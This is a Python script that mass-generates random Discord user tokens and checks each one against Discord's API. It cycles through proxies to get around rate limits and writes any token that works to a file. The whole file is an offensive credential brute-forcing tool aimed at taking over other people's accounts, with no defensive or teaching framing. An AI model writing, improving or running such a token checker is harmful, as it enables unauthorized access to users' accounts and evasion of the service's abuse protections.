import random
import string
import os
import requests
import proxygen
from itertools import cycle
import base64
from random import randint

N = input("How many tokens : ")
count = 0
current_path = os.path.dirname(os.path.realpath(__file__))
url = "https://discordapp.com/api/v6/users/@me/library"

while(int(count) < int(N)):
    tokens = []
    base64_string = "=="
    while(base64_string.find("==") != -1):
        sample_string = str(randint(000000000000000000, 999999999999999999))
        sample_string_bytes = sample_string.encode("ascii")
        base64_bytes = base64.b64encode(sample_string_bytes)
        base64_string = base64_bytes.decode("ascii")
    else:
        token = base64_string+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits)
                                                                                      for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))
        count += 1
        tokens.append(token)
    proxies = proxygen.get_proxies()
    proxy_pool = cycle(proxies)

    for token in tokens:
        proxy = next(proxy_pool)
        header = {
            "Content-Type": "application/json",
            "authorization": token
        }
        try:
            r = requests.get(url, headers=header, proxies={'https':"http://"+proxy})
            print(r.text)
            print(token)
            if r.status_code == 200:
                print(u"\u001b[32;1m[+] Token Works!\u001b[0m")
                f = open(current_path+"/"+"workingtokens.txt", "a")
                f.write(token+"\n")
            elif "rate limited." in r.text:
                print("[-] You are being rate limited.")
            else:
                print(u"\u001b[31m[-] Invalid Token.\u001b[0m")
        except requests.exceptions.ProxyError:
            print("BAD PROXY")
    tokens.remove(token)
